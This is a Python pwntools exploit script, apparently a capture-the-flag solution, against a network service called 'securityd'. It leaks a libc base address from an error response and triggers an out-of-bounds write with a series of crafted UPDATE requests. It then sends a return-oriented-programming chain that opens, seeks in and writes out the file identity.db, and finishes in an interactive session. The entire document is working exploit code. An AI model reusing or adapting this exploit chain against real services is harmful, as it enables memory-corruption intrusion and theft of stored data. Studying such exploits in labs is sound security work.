#!/usr/bin/env python3
from pwn import *

HOST = "127.0.0.1"
PORT = 5555

exe  = ELF("players/securityd")
libc = ELF("players/libc.so.6")

def start():
    return remote(HOST, PORT)

def get_leak():
    io = start()
    io.sendline(b"GET 1337")
    log.info("Request 1...")
    io.recv()
    sleep(5)
    io.sendline(b"GET 1337")
    log.info("Request 2...")
    io.recvuntil(b"ERR code=")
    libc.address = int(io.recvuntil(b"\n")[2:-1],16) - 0x1cbe3d
    io.close()


def trigger_securityd_oob_crash():

    N_TCC = 6
    tcc_ios = []
    add_rsp = libc.address + 0x000000000012e01b
    for i in range(N_TCC):
        ROLE = b"identity.db"
        io = start()
        tcc_ios.append(io)
        print("UPDATE 1337 TESTUSER 4141 a@a.com".encode() + ROLE + b"\n")
        io.send("UPDATE 1337 TESTUSER 4141 a@a.com ".encode() + ROLE + b"\n")

    io = start()
    tcc_ios.append(io)
    ROLE = b"AAAA" + p64(add_rsp) + p64(exe.sym['op_check_update']) + p64(exe.sym['op_check_get']) + p64(0x4242424242)*4 
    print("UPDATE 1337 TESTUSER 4141 a@a.com ".encode() + ROLE + b"\n")
    io.sendline(b"UPDATE 1337 TESTUSER 4141 a@a.com " + ROLE )

    for i in tcc_ios:
        i.close()

def main():
    
    get_leak()
    log.success(f"Libc: {hex(libc.address)}")
    trigger_securityd_oob_crash()
    io = start()
    ret     = libc.address + 0x000000000002882f
    pop_rdi = libc.address + 0x000000000010f78b
    pop_rsi_r15 = libc.address + 0x000000000010f789
    pop_rdx = libc.address + 0x00000000000ab8a1
    pop_rcx = libc.address + 0x00000000000a877e
    identity_str = exe.sym.g_state + 0x2ec
    ret2handle = exe.sym.handle_client + 704
    fd = 0xd
    buf = 0x405188 # Random zeroed zone 
    #ropchain: open(identity.db) --> lseek(offset_1337) --> write(0x1)
    role =  p64(0xdeadbeefcafebabe)*1 + p64(pop_rdi) + p64(identity_str) + p64(pop_rsi_r15) + p64(0x2) + p64(0xdeadbeefcafebabe) + p64(libc.sym.open) + p64(libc.address + 0x000000000019e361) + p64(pop_rdi) + p64(fd) + p64(pop_rsi_r15) + p64(0x1fa0) + p64(0xdeadbeefcafebabe) + p64(libc.sym.lseek) + p64(pop_rdi) + p64(fd)  + p64(ret) + p64(pop_rsi_r15) + p64(buf) + p64(0xdeadbeefcafebabe) + p64(pop_rcx) + p64(identity_str)  + p64(pop_rdx) + p64(0x1) + p64(exe.sym.write) + p64(ret2handle)
    io.sendline(b"ADD test 666 test@test.test " + role)
    io.sendline(b"GET 1337")
    io.interactive()
    

if __name__ == "__main__":
    main()
